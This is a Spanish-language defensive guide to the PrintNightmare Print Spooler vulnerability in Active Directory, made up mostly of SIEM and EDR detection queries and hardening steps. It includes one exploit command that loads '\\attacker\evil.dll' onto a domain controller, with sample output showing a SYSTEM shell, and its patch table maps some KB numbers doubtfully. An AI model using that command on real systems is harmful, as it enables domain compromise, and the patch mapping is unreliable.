# 🛑 PrintNightmare en Active Directory

---

## 📝 ¿Qué es PrintNightmare?

| Concepto      | Descripción                                                                                                 |
|---------------|------------------------------------------------------------------------------------------------------------|
| **Definición**| PrintNightmare es un conjunto de vulnerabilidades críticas en el servicio Print Spooler de Windows que permite ejecución remota de código y/o escalada de privilegios. |
| **Requisito** | El atacante debe tener acceso a la red y el Print Spooler debe estar activo en el sistema objetivo (servidores, estaciones, DCs).                |

---

## 🛠️ ¿Cómo funciona el ataque?

| Fase             | Acción                                                                                         |
|------------------|------------------------------------------------------------------------------------------------|
| **Conexión**     | El atacante se conecta al servicio Print Spooler vía RPC/SMB, normalmente usando autenticación de dominio.|
| **Carga**        | Carga un controlador de impresora (DLL) malicioso, abusando de la función AddPrinterDriverEx.  |
| **Ejecución**    | El controlador malicioso se ejecuta como SYSTEM, permitiendo RCE o escalada de privilegios.    |
| **Persistencia** | Puede usarse para mantener acceso privilegiado si no se parchea o desactiva el servicio.        |

---

## 💻 Ejemplo práctico

```bash
# Uso de herramienta pública para explotar PrintNightmare:
python3 CVE-2021-34527.py <DC_IP> <'DOMAIN/user:pass'> '\\attacker\evil.dll'
```

```
[*] Connecting to the target Print Spooler service...
[*] Uploading malicious DLL via AddPrinterDriverEx...
[*] Triggering DLL execution as SYSTEM...
[+] SYSTEM shell obtained!
```

---

## 📊 Detección en logs y SIEM

| Campo clave                   | Descripción                                                                 |
|-------------------------------|----------------------------------------------------------------------------|
| **EventCode = 808, 316, 307** | Eventos de creación/carga de impresora o controlador en Print Service.      |
| **Proceso spoolsv.exe**       | Procesos hijackeados o DLLs cargadas desde rutas no estándar.              |
| **Cambios en registro Print** | Modificación de claves de registro asociadas a drivers de impresora.        |
| **Sysmon ID 7 / ID 1**        | Carga de DLLs sospechosas o ejecución de comandos fuera de contexto.       |

### Query Splunk básica

```splunk
index=dc_logs sourcetype=WinEventLog:Microsoft-Windows-PrintService/Operational (EventCode=808 OR EventCode=316 OR EventCode=307)
| table _time, ComputerName, UserID, Param1, Param2
```

---

## 🔎 Queries completas para más investigación

### 1. Detección de cargas de drivers desde rutas inusuales

```splunk
index=sysmon EventCode=7 Image="*spoolsv.exe" NOT (ImageLoaded="C:\\Windows\\System32\\*")
| table _time, Computer, Image, ImageLoaded, User
```

### 2. Creación de impresoras/controladores fuera de horario o por usuarios no admins

```splunk
index=dc_logs sourcetype=WinEventLog:Microsoft-Windows-PrintService/Operational (EventCode=316 OR EventCode=808)
| where UserID!="S-1-5-18"
| stats count by _time, ComputerName, UserID, Param1
```

### 3. Cambios en el registro Print Spooler

```splunk
index=sysmon EventCode=13 TargetObject="*Print*"
| table _time, Computer, TargetObject, Details, User
```

### 4. Ejecución de comandos SYSTEM anómalos vía spoolsv.exe

```splunk
index=sysmon EventCode=1 ParentImage="*spoolsv.exe"
| table _time, Computer, CommandLine, User
```

### 5. Tráfico RPC/SMB anómalo hacia spoolsv.exe

```splunk
index=network_logs dest_port=445 OR dest_port=139 process="spoolsv.exe"
| stats count by src_ip, dest_ip, process
| where count > 10
```

---

## 🛡️ Detección con Windows Defender for Endpoint

### Reglas de detección personalizadas

```kql
// PrintNightmare - Detección de carga de drivers maliciosos
DeviceEvents
| where ActionType == "DriverLoad"
| where InitiatingProcessFileName == "spoolsv.exe"
| where not(FolderPath startswith "C:\\Windows\\System32\\")
| project Timestamp, DeviceName, FolderPath, SHA1, InitiatingProcessFileName
| order by Timestamp desc
```

```kql
// Detección de uso de exploits conocidos de PrintNightmare
DeviceProcessEvents
| where ProcessCommandLine has_any ("CVE-2021-34527", "CVE-2021-1675", "AddPrinterDriverEx", "PrintNightmare")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName
| order by Timestamp desc
```

```kql
// Detección de modificaciones en Print Spooler
DeviceRegistryEvents
| where RegistryKey contains "Print" and RegistryKey contains "Drivers"
| where ActionType == "RegistryValueSet"
| project Timestamp, DeviceName, RegistryKey, RegistryValueName, RegistryValueData
| order by Timestamp desc
```

### Alertas recomendadas

| Regla | Descripción | Severidad |
|-------|-------------|-----------|
| **Suspicious Print Driver Load** | Carga de driver desde ubicación no estándar por spoolsv.exe | Alta |
| **PrintNightmare Exploitation** | Detección de herramientas de explotación conocidas | Crítica |
| **Print Spooler Registry Changes** | Modificaciones sospechosas en registro de Print Spooler | Media |

---

## 🦅 Detección con CrowdStrike Falcon

### Hunting queries (Event Search)

```sql
-- Detección de PrintNightmare basado en carga de drivers
event_platform=Win event_simpleName=ImageLoad
| search ImageLoaded=*spoolsv.exe ImageLoadedPath!=*System32*
| table _time, ComputerName, UserName, ImageLoaded, ImageLoadedPath, ParentProcessId
| sort - _time
```

```sql
-- Detección de explotación de Print Spooler
event_platform=Win event_simpleName=ProcessRollup2 
| search (CommandLine=*CVE-2021-34527* OR CommandLine=*PrintNightmare* OR CommandLine=*AddPrinterDriverEx*)
| table _time, ComputerName, UserName, FileName, CommandLine, SHA256HashData
| sort - _time
```

```sql
-- Detección de cambios en servicios de impresión
event_platform=Win event_simpleName=ServiceActivity
| search ServiceName=*Spooler* ActivityType IN (Start, Stop, Install)
| table _time, ComputerName, ServiceName, ActivityType, UserName
| sort - _time
```

### Custom IOAs (Indicators of Attack)

```sql
-- IOA para detectar carga de DLLs maliciosas en spoolsv.exe
event_platform=Win event_simpleName=ModuleLoad
| search ImageFileName=*spoolsv.exe ModuleFileName!=*System32*
| stats count by ComputerName, ModuleFileName, UserName
| where count > 1
```

---

## 🔍 Queries KQL para Microsoft Sentinel

### Detección de PrintNightmare

```kql
// Query principal para detectar explotación de PrintNightmare
DeviceProcessEvents
| where InitiatingProcessFileName == "spoolsv.exe"
| where ProcessCommandLine != ""
| where not(FolderPath startswith "C:\\Windows\\System32\\")
| project TimeGenerated, DeviceName, ProcessCommandLine, FolderPath, AccountName
| order by TimeGenerated desc
```

```kql
// Correlación con eventos de Print Service
Event
| where Source == "Microsoft-Windows-PrintService" and EventID in (808, 316, 307)
| join kind=inner (
    DeviceEvents
    | where ActionType == "DriverLoad" and InitiatingProcessFileName == "spoolsv.exe"
) on Computer
| project TimeGenerated, Computer, EventID, ActionType, FolderPath
```

### Hunting avanzado

```kql
// Detección de patrones de explotación
SecurityEvent
| where EventID == 4648 // Explicit logon
| where ProcessName contains "spoolsv.exe"
| join kind=inner (
    DeviceFileEvents
    | where ActionType == "FileCreated" and FolderPath contains "spool\\drivers"
    | project TimeGenerated, DeviceName, FolderPath, SHA1
) on $left.Computer == $right.DeviceName
| where TimeGenerated1 > TimeGenerated and TimeGenerated1 - TimeGenerated < 1h
| project TimeGenerated1, Computer, ProcessName, FolderPath, SHA1
```

```kql
// Detección de movimiento lateral post-explotación
SecurityEvent
| where EventID == 4624 and LogonType == 3
| where Account !endswith "$"
| summarize by TimeGenerated, Account, Computer, IpAddress
| join kind=inner (
    DeviceProcessEvents
    | where InitiatingProcessFileName == "spoolsv.exe" and ProcessCommandLine != ""
    | project TimeGenerated, DeviceName, ProcessCommandLine
) on $left.Computer == $right.DeviceName
| where TimeGenerated1 > TimeGenerated and TimeGenerated1 - TimeGenerated < 2h
| project TimeGenerated1, Computer, Account, ProcessCommandLine, IpAddress
```

---

## 🦾 Hardening y mitigación

| Medida                                           | Descripción                                                                                 |
|--------------------------------------------------|--------------------------------------------------------------------------------------------|
| **Parchear sistemas**                            | Instala los parches más recientes de Microsoft para PrintNightmare y variantes.             |
| **Desactivar Print Spooler donde no sea necesario** | `Stop-Service Spooler` y `Set-Service Spooler -StartupType Disabled` en DCs y servidores críticos.  |
| **Limitar instalación de drivers**               | GPO: “Allow Print Spooler to accept client connections” y “Package Point and Print - Approved Servers”. |
| **Monitorización continua**                      | Vigilar logs de PrintService y Sysmon para detectar cargas de DLLs/controladores anómalos.  |
| **Bloquear tráfico SMB innecesario**             | Restringir puertos 445/139 a lo mínimo posible entre estaciones y servidores.               |
| **Auditoría y alertas**                          | Configurar alertas SIEM para eventos Print Spooler críticos y cargas de DLL no autorizadas. |

---

## 🔧 Parches y actualizaciones

| Parche/Update | Descripción                                                                                  |
|---------------|----------------------------------------------------------------------------------------------|
| **KB5005010** | Windows 11 - Parche crítico principal para CVE-2021-34527 (PrintNightmare).                 |
| **KB5004945** | Windows 10 21H1/21H2 - Correcciones completas para todas las variantes de PrintNightmare.   |
| **KB5005033** | Windows Server 2022 - Parche esencial que corrige vulnerabilidades RCE en Print Spooler.    |
| **KB5004954** | Windows Server 2019 - Mitigación completa de escalada de privilegios via Print Spooler.     |
| **KB5004946** | Windows Server 2016 - Correcciones de seguridad críticas para Print Spooler.                |
| **KB5005573** | Windows Server 2012 R2 - Parche de seguridad para sistemas legacy afectados.               |

### Configuraciones de registro post-parche

```powershell
# Configurar restricciones de Point and Print (post-parche)
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint" -Name "RestrictDriverInstallationToAdministrators" -Value 1
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint" -Name "NoWarningNoElevationOnInstall" -Value 0
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint" -Name "UpdatePromptSettings" -Value 0

# Habilitar logs detallados del Print Spooler
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Print" -Name "LogLevel" -Value 2
```

### Verificación de aplicación de parches

```powershell
# Verificar que los parches estén instalados
Get-HotFix -Id KB5005010, KB5004945, KB5005033, KB5004954, KB5004946

# Verificar versión del Print Spooler
Get-WmiObject -Class Win32_SystemDriver | Where-Object {$_.Name -eq "spoolsv"}
```

### Actualizaciones críticas de seguridad relacionadas

- **CVE-2021-34527**: PrintNightmare RCE principal (KB5005010, KB5004945)
- **CVE-2021-1675**: PrintNightmare escalada de privilegios local (KB5004945)
- **CVE-2021-34481**: Bypass de restricciones Point and Print (KB5005652)
- **CVE-2022-21999**: Nueva variante PrintNightmare (KB5010793)

### Validación post-parche

```powershell
# Script para validar que la configuración está segura
$regPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint"
$restrictDrivers = Get-ItemProperty -Path $regPath -Name "RestrictDriverInstallationToAdministrators" -ErrorAction SilentlyContinue
if ($restrictDrivers.RestrictDriverInstallationToAdministrators -eq 1) {
    Write-Host "✓ Restricción de drivers configurada correctamente" -ForegroundColor Green
} else {
    Write-Host "✗ ALERTA: Restricción de drivers NO configurada" -ForegroundColor Red
}
```

---

## 🧑‍💻 ¿Cómo revisar si Print Spooler está activo y expuesto?

```powershell
Get-Service -Name Spooler
Get-Printer
```
O comprobar puertos abiertos y sesiones RPC/SMB activas en DCs.

---

## 📚 Referencias

- [Microsoft Security Advisory CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527)
- [PrintNightmare - HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/printnightmare)
- [Print Spooler Service Guidance - Microsoft Docs](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/print-spooler-security-guidance)
